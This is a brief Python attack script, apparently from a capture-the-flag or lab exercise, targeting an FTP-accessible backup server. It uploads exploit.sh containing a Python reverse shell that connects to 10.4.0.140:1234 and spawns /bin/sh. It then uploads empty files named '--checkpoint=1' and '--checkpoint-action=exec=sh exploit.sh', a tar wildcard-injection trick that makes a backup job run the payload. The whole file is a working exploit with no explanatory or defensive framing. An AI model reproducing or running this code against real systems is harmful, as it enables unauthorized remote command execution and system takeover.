#!/usr/bin/env python3.7

from ftplib import FTP
import io

#Connecting to the host
ftp = FTP(host= '172.20.0.1')

#login for ftp user
ftp.login(user= "backupmgr", passwd= "[REDACTED]")
ftp.getwelcome()

ftp.set_pasv(False)
ftp.dir()
ftp.cwd('/files')

payload = io.BytesIO(b'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.4.0.140",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\'')
empty = io.BytesIO(b'')

ftp.storlines('STOR exploit.sh', payload)
ftp.storlines('STOR --checkpoint=1', empty)
ftp.storlines('STOR --checkpoint-action=exec=sh exploit.sh', empty)

ftp.quit()
